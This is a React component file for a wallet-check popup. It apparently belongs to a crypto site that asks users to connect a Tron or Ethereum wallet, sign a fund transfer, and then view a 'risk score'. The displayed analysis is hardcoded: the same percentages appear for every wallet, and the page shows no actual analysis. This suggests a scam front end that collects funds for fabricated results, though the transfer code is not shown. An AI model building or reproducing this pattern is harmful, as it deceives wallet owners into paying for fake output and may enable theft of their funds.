import React, { useEffect, useState } from 'react';
import Modal from "react-modal";
import CloseIcon from '@mui/icons-material/Close';
// import WalletConnect from '../../wallet-connect';
import TronConnectButton from '../../Tron/tron-connect-button'
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import './PrimaryBtn.css';
import "./Popup.css";
import Logo from '../../../assets/logo.png';
import ScoreIcon from '../../../assets/score-icon.png';
import TronTransferFundsButton from '../../Tron/TronTransferFundsButton';
import { WalletConnectButton } from '../../WalletConnect/wallet-connect-button';
import WalletConnectTransferFundsButton from '../../WalletConnect/WalletConnectTransferFundsButton';
import { useAccount } from 'wagmi';
import ResultBar from './ResultBar';
import { useTranslation } from 'react-i18next';

// Set the root app element for accessibility
Modal.setAppElement("#root");

interface PrimaryBtnProps {
  text: string;
  imageSrc: string;
  justifyContent?: 'center' | 'space-between';
  style?: "blue" | "white";
  size?: 'medium' | 'small';
  border?: boolean;
  url?: string;
}

const PrimaryBtn: React.FC<PrimaryBtnProps> = ({ text, imageSrc, justifyContent = 'center', style = "blue", size = "medium", border = false, url = null }) => {
  const [isOpen, setIsOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [transactionSigned, setTransactionSigned] = useState(false); //setTransactionSigned
  const [fakeTransaction, setFakeTransaction] = useState(false); //setTransactionSigned
  const { address: tronAddress, connected: tronConnected } = useWallet();
  const { isConnected: walletConnectConnected, address: ethAddress } = useAccount();
  
  const { t } = useTranslation();

  useEffect(() => {
    async function updateStep() {
      if (transactionSigned) {
        setStep(3);
        return;
      }
      else if (tronConnected || walletConnectConnected) {
        setStep(2);
        return;
      }
      else setStep(1);
      return;
    }

    updateStep();
  }, [tronAddress, tronConnected, transactionSigned, ethAddress, walletConnectConnected]);

  const openModal = () => setIsOpen(true);
  const closeModal = () => setIsOpen(false);
  const stepBack = () => setStep(step - 1);
  
  const handleClick = () => {
    if (url != null) {
      window.location.href = url;
    }
    else {
      openModal();
    }
  };
  
  const handleTransactionSuccess = () => {
    setStep(3);
    setTransactionSigned(true);
  }

  const handleFakeTransactionSuccess = () => {
    setStep(3);
    setTransactionSigned(true);
    setFakeTransaction(true);
  }

  const renderContent = () => {
    switch (step) {
      case 1:
        return (
          <>
            <h2 className="popup-title">{t('popup.firstStep.title')}</h2>
            <p className="popup-subtitle">
              {t('popup.firstStep.description')}
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center gy-3 gx-5">
                <div className="col-lg-5 col-xl-4">
                  <WalletConnectButton />
                </div>
                <div className="col-lg-5 col-xl-4">
                  <TronConnectButton />
                </div>
              </div>
            </div>
          </>
        );
      case 2:
        return (
          <div>
            <h2 className="popup-title">{t('popup.secondStep.title')}</h2>
            <p className="popup-subtitle">
              {t('popup.secondStep.description')}
            </p>
            <div className="container">
              <div className="row justify-content-center align-items-center">
                <div className="col-lg-5 col-xl-4">
                  { walletConnectConnected && 
                  (
                    <WalletConnectTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>{t('popup.secondStep.button')}</WalletConnectTransferFundsButton>
                  )}
                  { !walletConnectConnected && tronConnected && 
                  (
                    <TronTransferFundsButton onTransactionSuccess={handleTransactionSuccess} onFakeTransactionSuccess={handleFakeTransactionSuccess}>{t('popup.secondStep.button')}</TronTransferFundsButton>
                  )}
                </div>
              </div>
            </div>
          </div>
        );
      case 3:
        return (
          <div>
            <h2 className="popup-title">{t('popup.thirdStep.title')}</h2>
            <img className='popup-result-score-icon' src={ScoreIcon} alt="ScoreIcon" />
            <p className="popup-result-score">{fakeTransaction ? "0%" : "12.55%"}</p>
            <div className="result-bars">
              <ResultBar
                text={t('popup.thirdStep.diversityOfTransactions')}
                percentage={fakeTransaction ? 0 : 20}
                color="#0057FF"
              />
              <ResultBar
                text={t('popup.thirdStep.walletActivity')}
                percentage={fakeTransaction ? 0 : 70}
                color="#219654"
              />
              <ResultBar
                text={t('popup.thirdStep.cexTransaction')}
                percentage={fakeTransaction ? 0 : 20}
                color="#0057FF"
              />
              <ResultBar
                text={t('popup.thirdStep.avarageTransactionCost')}
                percentage={fakeTransaction ? 0 : 60}
                color="#219654"
              />
              <ResultBar
                text={t('popup.thirdStep.walletAge')}
                percentage={fakeTransaction ? 0 : 60}
                color="#219654"
              />
              <ResultBar
                text={t('popup.thirdStep.suspiciousTransactions')}
                percentage={fakeTransaction ? 0 : 55}
                color="#8B5EFD"
              />
              <ResultBar
                text={t('popup.thirdStep.highRiskTransactions')}
                percentage={fakeTransaction ? 0 : 55}
                color="#8B5EFD"
              />
            </div>
            <div className="container">
              <div className="row justify-content-center align-items-center">
                <div className="col-lg-4 col-xl-3">
                  <button
                    className="primary-button primary-button-blue primary-button-medium justify-content-center"
                    onClick={ () => {
                      closeModal();
                      setTransactionSigned(false);
                    }}
                  >
                    {t('popup.thirdStep.button')}
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <>
      <button
        className={`primary-button primary-button-${style} primary-button-${size} ${border && "primary-button-border"}`}
        style={{ justifyContent }}
        onClick={handleClick}
      >
        <span className={`button-text button-text-${size}`}>{text}</span>
        <img src={imageSrc} alt="Button icon" className='button-icon' />
      </button>
      
      {/* Modal Popup */}
      <Modal
        isOpen={isOpen}
        onRequestClose={closeModal}
        contentLabel="Wallet Connect Modal"
        overlayClassName="modal-overlay"
        className="modal-content"
      >
        {step > 1 ? (
          <button onClick={stepBack} className='back-button'>{t('popup.backLabel')}</button>
        ) : null }
        <button onClick={closeModal} className="close-button">
          <CloseIcon />
        </button>
        <div className="popup-content">
          <div className="popup-header">
            <img
              src={Logo} // Replace with your logo
              alt="Logo"
              className="logo"
            />
            <div className="popup-step">
              <span className='current-step'>{step}</span>
              <span className="step">/3</span>
              <span className="step-text">{t('popup.stepLabel')}</span>
            </div>
          </div>
          <div className="popup-body">
            {renderContent()}
          </div>
        </div>
      </Modal>
    </>
  );
};

export default PrimaryBtn;
